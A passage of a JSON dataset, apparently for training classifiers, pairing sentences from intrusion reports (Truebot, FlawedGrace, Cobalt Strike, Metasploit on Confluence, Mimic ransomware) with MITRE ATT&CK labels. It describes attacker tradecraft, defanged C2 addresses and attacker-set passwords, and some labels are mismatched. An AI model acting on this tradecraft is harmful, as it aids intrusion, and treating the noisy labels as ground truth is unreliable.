    "text": "The tools they transfer to the remote hosts range from remote administration tools, such as Atera agent, to Cobalt Strike beacons and ransomware payloads.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This is most often observed in logs via the threat actors’ removal of the temporary location of the export of the infected users inbox.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Although, in two reports last year we observed threat actors manually reviewing share data while still in the network, allowing a defender to see what data was accessed by the threat actors.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Intrusions overwhelmingly favored two MITRE techniques, T1071.001 Web Protocols and T1219 Remote Access Tools.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "In Dead or Alive? An Emotet Story , the threat actor first created a copy of the relevant files before uploading them to MEGA.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "The file download was a Truebot executable, which appeared as a fake Adobe Acrobat document.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "After executing the file, Truebot copied and renamed itself.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Minutes later, Truebot loaded FlawedGrace onto the host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "From there, FlawedGrace’s execution routine involved storing as well as extracting, encoded and encrypted payloads in registry; the creation of temporary scheduled tasks and the injection of the final payload into msiexec.exe and svchost.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "After this execution, the threat actors proceeded to disable Windows Defender Real-Time monitoring and added exclusions for executable files on the host.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "We later observed FlawedGrace creating a temporary user within the local Administrators and Remote Desktop Users groups.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "With this user, a tunneled RDP connection was attempted from FlawedGrace’s C2 servers.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Seemingly without success, the threat actors removed the user after 15 minutes before repeating the procedure a second time.",
    "command": "",
    "labels": [
      "T1070.004",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "After the second failed attempt, the threat actors removed the user and did not attempt further RDP communications.",
    "command": "",
    "labels": [
      "T1070.004",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Now, four hours into the intrusion the threat actors, through the Cobalt Strike beacon, started another round of discovery commands using net, nltest, tasklist and AdFind.exe.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "After having accessed LSASS memory on the beachhead host, the threat actors leveraged a local administrator hash to perform pass-the-hash lateral movement through the environment.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "These discovery commands included the PowerShell, cmdlet Get-MpComputerStatus, and quser.",
    "command": "",
    "labels": [
      "T1016",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Following each lateral movement action, Cobalt Strike loaded FlawedGrace in memory on all hosts accessed by the adversary.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The FlawedGrace malware has been reportedly associated, but not exclusive, to TA505, and has commonly been distributed by Truebot.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "According to Mandiant, in January 2023 FIN11 was observed deploying TRUECORE (a version of Truebot) and BARBWIRE (FlawedGrace) after exploiting a SolarWinds Serv-U server (CVE-2021-35211).",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "During this time, BARBWIRE C2 was communicating with 5.188.86[.]18:443, which we observed in this case.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "In April, Mandiant again observed BARBWIRE C2 communicating to 5.188.86[.]18:443 as well as 92.118.36[.]199:443, which was also observed during this case.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "During this time period, Mandiant also noted that shellcode payloads were staged on a TRUECORE C2 server, which pointed to 5.188.206[.]78, the Cobalt Strike server in this case.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The resulting hxxps[://]ecorfan[.]org/base/sj/Document_may_24_16654[.]exe URL performed a drive-by download, delivering the initial Truebot payload Document_may_24_16654.exe.",
    "command": "",
    "labels": [
      "T1105",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The usage of the deceptive Document_may_24_16654.exe naming would then entice fooled users to open what they believe is a recent document.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Truebot was used to load both Cobalt Strike and FlawedGrace on the initial host.",
    "command": "",
    "labels": [
      "T1055",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The payload, Document_may_24_16654.exe, imitated a PDF document by using an icon of an Adobe Acrobat document.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "This was further enforced upon the user when the malware created the following message claiming Adobe Acrobat failed to open the file (even if Acrobat was not installed on the target system).",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Truebot’s first action was to create an exact copy of itself in the following path and then execute it.",
    "command": "",
    "labels": [
      "T1055",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The newly created copy reached out to the Truebot C2 of essadonio[.]com (45.182.189[.]71).",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Truebot spawned an instance of C:\\Windows\\system32\\cmd.exe which was followed-up by a remote thread created in the new process.",
    "command": "",
    "labels": [
      "T1055",
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The memory of cmd.exe clearly indicated signs of injection, as seen below, where a section of memory was set to execute and read write as well as the telltale MZ (0x4d5a) header of a PE binary.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Further investigation identified the injected module beacon.dll at the same offset as above (0x164a2fb0000) in the loaded modules of the target process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This Cobalt Strike beacon was used both to query information and move around the network which will be discussed in later sections.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The first observed behavior of this chain was to create a new instance of spoolsv.exe that was shortly accessed by the Truebot process (RuntimeBroker.exe).",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This process would then spawn instances of msiexec.exe, which would reach out to the initial FlawedGrace C2 of 92.118.36[.]199.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Instead of creating a task through schtasks.exe, FlawedGrace used three different methods to create new scheduled tasks.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The first was to import the taskschd.dll library into the main host process to create a new task called 2.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The task was removed as soon as the new command gained SYSTEM-level privileges.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The second was observed within obfuscated PowerShell, where the Schedule.Service COM Object was used to create a new task.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The last method was to use native PowerShell cmdlets to register a task.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "It then reads a value from the Windows Registry under the SOFTWARE\\2\\CLSID\\{8D81676C-7F63-8F81-676E-666B-666B6C67818D}\\Type key, converts the value to a UTF-8 string, and executes it.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Based on script block logging, the PowerShell script contained in the registry would manipulate and populate further registry keys in the HKLM:\\Software\\Classes\\CLSID\\ key using HKLM:\\Software\\2\\CLSID as a staging location.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "The malware would create additional scheduled tasks using one of the following names selected randomly:",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The final loaded PowerShell script was stored here: HKLM\\Classes\\CLSID\\{8D81676C-7F63-8F81-676E-666B6C67818D}\\TypeLib",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "The PowerShell code in TypeLib would decrypt the RC4 encrypted payload stored in ProgID using a key based on the hostname ($env:COMPUTERNAME) of the target host and then inject the DLL into the FlawedGrace msiexec.exe and svchost.exe processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "When FlawedGrace attempted to run certain commands on the target host, it displayed the specific behavior of spawning an instance of cmd.exe as a sacrificial intermediate process.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Shortly after these instances of cmd.exe were spawned, they would be accessed by the FlawedGrace process svchost.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The scheduled tasks were configured to load FlawedGrace using PowerShell.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "While the tasks created initially to run FlawedGrace were registered with the task name of \\2 , tasks created for persistence used a naming convention mimicking various system tasks and placed under the \\Microsoft\\Windows\\ task path.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "These tasks were then set up for a BootTrigger to restart the malware.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "This account was then added to the Local Administrators group and Remote Desktop Users group.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The account was observed being used to test RDP tunneling in the environment.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "To abuse this SCM behavior, the threat actors were seen stopping the Spooler service before deleting the service’s HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\Spooler\\RequiredPrivileges registry entry, restarting the service and injecting into the newly created spoolsv.exe process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Scheduled tasks were used by the threat actors to run much of their malware as SYSTEM.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The initial execution tasks for FlawedGrace used the \\2 registered task were created to run under SYSTEM as seen by the Author in the task details.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "This could then be seen with the user NT AUTHORITY\\SYSTEM running the task command and arguments in process creation logs.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Shortly after execution, the Truebot malware copied the initial malware to a new location renaming itself to RuntimeBroker.exe, masquerading as an executable responsible for managing certain application permissions.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "As covered in the execution section, FlawedGrace uses a number of techniques to perform evasion, including encoding, encryption, and storing payloads in the registry.",
    "command": "",
    "labels": [
      "T1012",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "During runtime, the FlawedGrace malware decrypts the RC4 encrypted registry stored payload.",
    "command": "",
    "labels": [
      "T1012",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "We observed process injection by all three malware families in this intrusion.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "First, Truebot used it to inject the Cobalt Strike payload into a cmd.exe process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Reviewing memory dumps, the injected MZ header for the Cobalt Strike beacon is easily observable in the injected cmd.exe process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Strike was not the only injection with observable headers, each svchost.exe and msiexec.exe also contained telltale injection signs like PAGE_EXECUTE_READWRITE protection and MZ file headers.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Some Registry Items were removed during the FlawedGrace PowerShell execution, specifically the items stored in HKLM:\\SOFTWARE\\2\\:",
    "command": "",
    "labels": [
      "T1012",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "File removal was observed with AdFind.exe being removed by the threat actors as well as Cobalt Strike beacon removal, after being used for lateral movement.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "In addition, they used the dir command to test the feasibility of connecting to remote servers within the network through the local administrator’s account.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "In addition to using net view to find open shares, the attackers also examined the registry of the local host and saved a list of all mapped shares in a text file called 1.txt.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "We also observed them using the wmic command to execute the same action on a remote host.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "They later viewed and deleted the text file using the type and del commands respectively.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "To check the status of the antimalware software that is installed, they used PowerShell along with the Get-MpComputerStatus cmdlet.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "AdFind was used in this intrusion, however, the threat actors limited the output only to collect operating system information and specific attributes from the domain user objects.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Although, there was one notable use of the tasklist command where threat actors used the /S parameter to retrieve the list of currently running processes from remote hosts.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "The event ID 7045 (A new service was installed in the system) in System.evtx showed clear evidence of the malicious service being installed.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "As we mentioned in the discovery phase, threat actors also used atexec to execute commands on remote hosts.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Impacket’s atexec module allows the remote execution of commands on a Windows system by leveraging the Task Scheduler service.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The module registers a task on a remote system that would execute the instructed command.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The task would then be deleted upon successful execution.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The example below is from the Security event logs, event ID 4698.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Threat actors used Cobalt Strike to facilitate the execution of this module.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "In some other cases, we saw threat actors executing the below command from the beachhead host toward a number of remote hosts.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "This command uses Windows Management Instrumentation CommandLine (WMIC) to remotely retrieve the executable paths of all running processes from a number of remote hosts.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "process: represents the WMI class to be queried; in this case, it’s related to running processes on the target system.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "get executablepath: is to retrieve the property ‘ExecutablePath’, which contains the complete path to the executable for each running process.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Additionally, populated and collected files included: C:\\ProgramData\\1.txt, C:\\Windows\\Temp\\KMzFGwGn.tmp, C:\\ProgramData\\1.csv, C:\\ProgramData\\person.csv, C:\\ProgramData\\servers_live_dir.txt.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "The extensive creation of text files (.txt and .csv) within the C:\\ProgramData directory provides detection and hunting opportunities as legitimate software commonly leverages sub-folders of this directory.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Communication to the Truebot C2 server at 45.182.189[.]71 began shortly after the execution of the initial access executable.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This connection, however, only lasted for around two hours on the beachhead host, and activity ceased after the Cobalt Strike beacon payload was loaded on the host.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Looking at memory collected from the beachhead host, we can observe the connection to the Truebot command and control server made by Runtimebroker.exe, the renamed executable copied from the initial malware payload.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Most no longer showed the responsible process, but at least one host had an active connection from an injected svchost.exe process to FlawedGrace command and control visible.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "During the first day of the intrusion, we observed a network signature hit for RDP tunneling from one of the FlawedGrace command and control servers, but due to no follow-up activity, it would appear that this did not function properly for the threat actors.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "This likely also explains the removal of the local user account that had been added to the Remote Desktop Users group.",
    "command": "",
    "labels": [
      "T1070.004",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Strike, unlike the other two malware families observed, remained in constant communication with its command and control server after the first beacon was loaded until the end of the intrusion.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "While the Cobalt Strike command and control stayed active over the intrusion the threat actors did selectively deploy and remove it on hosts with only the beachhead host maintaining beaconing activity for the whole duration.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "On the second day of the intrusion, a connection from a file server began to the IP 139.60.160[.]166 over port 4433.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The process tree indicates the FlawedGrace malware injected into svchost and msiexec on the file server and initiated the transfer.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "As a defense-evasion technique, MBR Killer has been observed using patched NSIS installers relying on non-standard headers.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Within 20 seconds they opened a command prompt and issued the following commands",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "From there they ran whoami /upn and then dropped AdFind.",
    "command": "",
    "labels": [
      "T1082",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor then ran a batch file which ran AdFind commands and output them to txt files.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors then added a local admin user named Adm.1c with a password of adm99!@.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "A threat actor recently brute forced a local administrator password using RDP and then dumped credentials using Mimikatz.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "They not only dumped LogonPasswords but they also exported all Kerberos tickets.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The account was created the previous day using a source IP of 54.38.67[.]132, which had been trying to brute force a local admin password.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor copied svshost.exe to C:\\naz\\naz and then executed it.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The PE file that installs XMRig (svshost.exe) also has a script (HideAll.bat) imbedded in it, which is called at runtime.",
    "command": "",
    "labels": [
      "T1055",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Before the threat actor disconnected, they changed the user password.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Mimikatz was used to dump credentials from memory, as well as, export Kerberos tickets using the following command:",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors used a vbs script named launch to execute mimikatz.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Since the log parameter was used, the output was saved to mimikatz.log",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Task manager was opened multiple times.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Possibly looking at logged in users and/or processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Net Accounts was used to review user policies.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "masscan and masscan gui were dropped but were not executed.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Using this access, the threat actor executed a consistent sequence of commands (installing AnyDesk, adding admin users, and enabling RDP) multiple times, suggesting the use of automation scripts or a playbook.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Tools like Mimikatz, ProcessHacker, and Impacket Secretsdump were used to harvest credentials.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Shortly thereafter, a different IP address used the same exploit, running curl to deploy a Metasploit payload (Meterpreter) and establish a C2 channel to 91.191.209[.]46.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This allowed the creation of a local administrator account (“noname”) and the re-installation of AnyDesk as a service (delivered via the Metasploit C2) for persistent remote access.",
    "command": "",
    "labels": [
      "T1078",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor then dropped tools focused on credential access, including Mimikatz, ProcessHacker, and Impacket’s Secretsdump.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Minutes after utilizing these tools, the threat actor managed to compromise a domain administrator account, granting them widespread access and control within the target environment.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "That domain admin account was likely compromised through LSASS dumping, as evidenced by later use of NTLM hashes during lateral movement.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Leveraging the compromised domain administrator credentials, the threat actor initiated lateral movement within the network, utilizing Impacket wmiexec and RDP to access additional systems.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Approximately 62 hours after the initial compromise of the Confluence server, the threat actor deployed ELPACO-team.exe, identified as a variant of Mimic ransomware, onto multiple servers, including backup and file servers by RDPing into them and executing the exe locally after copying it over SMB.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "While some data transfer was observed via the AnyDesk traffic, there was no evidence of collection or widespread data exfiltration prior to ransomware deployment.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "It’s plausible that the exploitation script used in the second instance, which downloaded and executed the Metasploit payload, could have been derived from or inspired by publicly available proof-of-concept as seen from this GitHub Repository.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The download of the executable HAHLGiDDb.exe triggered several Suricata alerts, providing initial possible identification of the payload as either a Cobalt Strike Stager or Metasploit: ETPRO MALWARE Cobalt Strike Stager Payload; ET HUNTING PE EXE Download over raw TCP",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "ETPRO HUNTING Suspicious Offset PE EXE or DLL Download on Non-Standard Ports",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "ET MALWARE Possible Metasploit Payload Common Construct Bind_API (from server)",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This sample is different from that in the Nviso blog in that this sample is 64-bit code that downloads and attempts to inject a Meterpreter DLL into other processes, and the Nviso blog describes a 32-bit version that spawns a remote cmd shell.",
    "command": "",
    "labels": [
      "T1055",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The payload, a Portable Executable (PE) file, was not encrypted and was easy to identify in network traffic.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The PE file that was downloaded over port 12385 was a 64-bit Windows DLL format that had zero exported functions other than DllMain, which is the function that runs whenever a process loads the DLL.",
    "command": "",
    "labels": [
      "T1055",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "In every instance, the same pattern was observed: a randomly-named DLL file was dropped to disk followed by a pipe event at close to the same time using a pipe name that was the same as the DLL filename, without the .dll extension.",
    "command": "",
    "labels": [
      "T1055",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Consider crafting a threat hunting query to match DLL file creation events with pipe creation events after removing the extension from the DLL filename and removing the backslashes from the pipe name.",
    "command": "",
    "labels": [
      "T1055",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "In the investigation of this case, such a query yielded clean results including only the Metasploit activity, even though there were many DLL file creation events and many pipe creation events.",
    "command": "",
    "labels": [
      "T1055",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Approximately three minutes after the Metasploit loader process started, it downloaded AnyDesk.exe and saved it to the Atlassian Confluence program directory.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Just over four minutes after the initial Metasploit payload was delivered, the threat actor again exploited Confluence to deliver another Metasploit loader and Meterpreter, following the same pattern as above, with the Metasploit EXE and DLL filenames randomized.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The loader name this time was RfHBBgXXYF.exe, and it was downloaded to the same user profile temp folder as before.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "One difference between the first Metasploit process and the second is that on the second attempt, the Metasploit loader created a cmd.exe process with no command line arguments, then proceeded to access that process and was granted access 0x1fffff, which means PROCESS_ALL_ACCESS.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The Metasploit loader then created the batch file u1.bat in the Atlassian\\Confluence folder in Program Files.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The purpose of u1.bat is described in the Persistence section below.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Less than one second after the Metasploit loader accessed the lsass process, a batch file named u1.bat was created in the Confluence folder C:\\Program Files\\Atlassian\\Confluence\\u1.bat.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The purpose of the u1.bat file was to create a new user account named “noname” with the password “Slepoy_123”, then use WMIC to find an administrators group, use net.exe (which calls net1.exe) to add the user to the admin group, then use WMIC to set the user’s password to never expire.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Although it wasn’t observed during this intrusion, event ID 4741, which records the creation of computer accounts, is also essential, as threat actors can interactively use a computer account to log on and execute commands in the same manner that a user account can be utilized.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "AnyDesk Service",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Within minutes of the new user account creation, the threat actor was observed dropping an AnyDesk binary into the Confluence installation directory (C:\\Program Files\\Atlassian\\Confluence) from the HAHLGiDDb.exe process.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Interestingly, the second Metasploit loader process also downloaded and saved AnyDesk.exe to the same folder a few minutes later.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This initial AnyDesk binary was then executed via the command line, also spawned from the HAHLGiDDb.exe process, to install AnyDesk on the system as a service in the ProgramData directory:",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Installation triggered several Sysmon ‘FileCreate’ events as well when dropping new configuration files in the ‘C:\\Windows\\SysWOW64\\config\\systemprofile\\AppData\\Roaming\\AnyDesk\\‘ directory",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Files Created:user.conf, ad.trace, system.conf, service.conf.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "After the installation was completed, several more commands were run to finish the setup, including a command line to start the service immediately:",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "The AnyDesk documentation shows how command line arguments can be used to set up unattended access.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "An argument to set the unattended access password for AnyDesk, as well as an echo command to provide the password “P@ssword1” to the AnyDesk password prompt:",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "This sequence of events to set the AnyDesk unattended password occurred three times during the intrusion.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The same password was set each time.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "On the third day of the intrusion, the threat actor, using an AnyDesk session, transferred a folder named “Attacker” from their host to the Desktop folder of a user on the Confluence server.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "From the documents, this method only requires the SeDebugPrivilege privilege (which the NETWORK SERVICE account does have), and iterates through all services to find one running under SYSTEM, then attempts to use reflective DLL Injection to run the elevator.dll in the memory of that service.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Shortly after the creation of this named pipe, the Metasploit payload (HAHLGiDDb.exe) was observed creating two cmd.exe sub-processes running under the SYSTEM privilege indicating successful escalation was obtained.",
    "command": "",
    "labels": [
      "T1055"
